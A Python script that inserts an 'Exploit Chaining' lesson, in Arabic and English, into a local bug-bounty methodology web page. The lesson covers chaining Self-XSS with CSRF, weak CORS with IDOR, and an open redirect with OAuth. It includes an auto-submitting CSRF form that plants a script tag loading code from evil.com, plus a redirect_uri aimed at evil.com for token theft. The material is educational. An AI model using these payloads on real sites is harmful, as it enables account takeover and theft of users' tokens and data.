import re
import codecs

path = 'd:/abdo_portfolio/build/methodology.html'
with codecs.open(path, 'r', 'utf-8') as f:
    content = f.read()

# 1. Add sidebar item for Exploit Chaining
sidebar_item = '''          <div class="meth-item" id="meth-ef-p_chaining" onclick="openMethPhase('p_chaining')" data-search="exploit chaining chain xss csrf ssrf rce mass account takeover">
            <span>🔗</span> <span style="color: #ff0055;">Exploit Chaining (ربط الثغرات)</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_chaining', '🔗 Exploit Chaining')">★</button>
          </div>'''

# Inject into Scenarios Category (cat-scenarios)
scen_pattern = r'(<div class="meth-item" id="meth-ef-p_apt"[^>]*>.*?</div>\s*</div>\s*</div>)'
# Actually let's just insert it before the closing div of cat-scenarios
idx = content.find('id="cat-scenarios"')
if idx != -1:
    end_idx = content.find('</div>\n      </div>', idx)
    if end_idx != -1:
        # Go up one div
        real_end = content.rfind('</div>', idx, end_idx + 6)
        content = content[:real_end] + sidebar_item + '\n        ' + content[real_end:]

# 2. Add Exploit Chaining Phase HTML
chaining_html = '''
      <!-- Phase: Exploit Chaining -->
      <div class="meth-content-view" id="meth-content-p_chaining" style="display: none; --tool-color: #ef4444;">
        <div class="phase-module-header">
          <div class="phase-module-icon" style="text-shadow: 0 0 15px #ef4444;">🔗</div>
          <div class="phase-module-meta">
            <h2 class="phase-module-title">Advanced Exploit Chaining (ربط الثغرات)</h2>
            <p class="phase-module-tagline">الثغرات البسيطة لا تجلب المال. كيف تدمج ثغرتين Low-Risk لصناعة دمار شامل (Critical Impact)!</p>
            <div class="phase-meta-badges">
              <span class="badge-time">⏱️ Execution: Varies</span>
              <span class="badge-difficulty" style="background:#ef4444; color:#fff;">God Mode</span>
            </div>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3 style="color:var(--neon-red);">☠️ The Synergy Effect (لماذا ندمج الثغرات؟)</h3></div>
          <p>الترياج (Triage) دائماً يبحث عن تأثير تجاري (Business Impact). ثغرة <code>Self-XSS</code> (حيث تضر نفسك فقط) تُرفض غالباً (N/A). وثغرة <code>CSRF</code> في تغيير الاسم تُعتبر Low/Medium. ولكن ماذا لو جمعتهما؟</p>
          <div class="tip-callout" style="border-left-color: var(--neon-red);">
            <div class="tip-callout-icon">🔥</div>
            <div class="tip-callout-text">
              <strong>القاعدة الذهبية:</strong> إذا لم يكن لثغرتك تأثير مباشر، ابحث عن ثغرة أخرى تساعدها على الوصول (Delivery) أو توسيع الصلاحيات (Escalation).
            </div>
          </div>
        </div>

        <!-- Chain 1: Self-XSS + CSRF -->
        <div class="cyber-card border-neon" style="border-color: #f59e0b;">
          <div class="card-header"><h3 style="color:#f59e0b;"><span class="hero-icon">🔗</span> Chain 1: Self-XSS + CSRF = 1-Click ATO</h3></div>
          <p><strong>السيناريو:</strong> وجدت XSS في حقل (العنوان - Address)، لكن هذا الحقل لا يراه أحد غير المستخدم نفسه (Self-XSS). ووجدت أن صفحة تحديث العنوان لا تحتوي على رمز حماية <code>CSRF Token</code>.</p>
          <p><strong>طريقة الربط:</strong></p>
          <ol class="t-check-list" style="list-style-type: decimal; padding-left: 20px;">
            <li>المهاجم يكتب صفحة HTML خبيثة تحتوي على Form خفي (CSRF).</li>
            <li>الـ Form يقوم بتغيير (العنوان) الخاص بالضحية ليصبح Payload الـ XSS: <code>&lt;script src="https://evil.com/steal.js"&gt;&lt;/script&gt;</code>.</li>
            <li>المهاجم يرسل رابط الصفحة الخبيثة للضحية.</li>
            <li>عندما يفتح الضحية الرابط، يتم تغيير عنوانه أوتوماتيكياً (CSRF)، ثم يتم تفعيل الـ XSS (بما أنه مسجل دخول)، ويقوم كود الـ JS بسرقة الكوكيز أو تغيير الإيميل!</li>
          </ol>
          <div class="terminal-window" dir="ltr" style="text-align: left; direction: ltr; margin-top: 15px;">
            <div class="terminal-header">
              <div class="terminal-dots"><span class="dot close"></span><span class="dot minimize"></span><span class="dot maximize"></span></div>
              <div class="terminal-title">attacker_server.html (The CSRF Payload)</div>
            </div>
            <div class="terminal-body">
              <div class="term-warn">&lt;!-- Auto-submitting form to inject the XSS --&gt;</div>
              <div class="term-cmd">&lt;form id="csrf_form" action="https://target.com/api/update_address" method="POST"&gt;
  &lt;input type="hidden" name="address" value="&amp;lt;script src='https://evil.com/hook.js'&amp;gt;&amp;lt;/script&amp;gt;" /&gt;
&lt;/form&gt;
&lt;script&gt;
  document.getElementById("csrf_form").submit();
&lt;/script&gt;</div>
            </div>
          </div>
        </div>

        <!-- Chain 2: CORS + IDOR -->
        <div class="cyber-card border-neon" style="border-color: #3b82f6;">
          <div class="card-header"><h3 style="color:#3b82f6;"><span class="hero-icon">🔗</span> Chain 2: Weak CORS + IDOR = Mass PII Leak</h3></div>
          <p><strong>السيناريو:</strong> يوجد API Endpoint <code>/api/user/105</code> يعرض بيانات حساسة ويعاني من IDOR، لكنه يحتاج <code>Authorization Bearer Token</code>. واكتشفت أن الموقع يقبل استدعاء البيانات من أي Origin (Weak CORS).</p>
          <p><strong>طريقة الربط:</strong> تقوم بإنشاء موقع خبيث يزورها الضحية (المدير). الموقع يرسل طلب XHR لجلب الـ Token الخاص به (بسبب ضعف CORS)، ثم يقوم السكريبت بحلقة تكرار (Loop) لاستخراج بيانات المستخدمين من رقم 1 إلى 1000 باستخدام الـ Token المسروق وإرسالها لك!</p>
        </div>

        <!-- Chain 3: Open Redirect + OAuth -->
        <div class="cyber-card border-neon" style="border-color: #8b5cf6;">
          <div class="card-header"><h3 style="color:#8b5cf6;"><span class="hero-icon">🔗</span> Chain 3: Open Redirect + OAuth = Account Hijacking</h3></div>
          <p><strong>السيناريو:</strong> وجدت Open Redirect بسيط (<code>?next=https://evil.com</code>)، ولكن تأثيره منخفض. ثم وجدت أن التطبيق يستخدم Facebook للـ Login (OAuth).</p>
          <p><strong>طريقة الربط:</strong></p>
          <ol class="t-check-list" style="list-style-type: decimal; padding-left: 20px;">
            <li>تبدأ عملية تسجيل الدخول بـ OAuth وتأخذ الرابط.</li>
            <li>تقوم بتعديل معامل <code>redirect_uri</code> ليشير إلى الـ Open Redirect الخاص بالتطبيق نفسه: <code>redirect_uri=https://target.com/login?next=https://evil.com</code>.</li>
            <li>الـ OAuth Provider (مثل فيسبوك) سيثق بالرابط (لأنه يشير للتطبيق). يرسل الـ Token للتطبيق، والتطبيق يقوم بعمل Redirect فوري لموقعك ويرسل لك الـ Token في الرابط!</li>
          </ol>
        </div>

        <button class="hack-btn" onclick="launchSimulation('chaining')">💻 Launch Live Attack Simulation (CSRF + XSS)</button>

        <button class="mark-complete-btn" id="complete-btn-p_chaining" onclick="markPhaseComplete('p_chaining','')" style="margin-top: 20px;">
          ✅ Mark Phase Complete — Exploit Chaining Mastery Achieved!
        </button>
      </div>
'''

if '<!-- Phase: IDOR Admin Takeover -->' in content:
    content = content.replace('<!-- Phase: IDOR Admin Takeover -->', chaining_html + '\n\n      <!-- Phase: IDOR Admin Takeover -->')
else:
    # Append at the end of meth-content blocks
    idx = content.rfind('<!-- End of Methodology Main Content -->')
    if idx != -1:
        content = content[:idx] + chaining_html + '\n\n      ' + content[idx:]

with codecs.open(path, 'w', 'utf-8') as f:
    f.write(content)
print("Chaining phase HTML added successfully.")
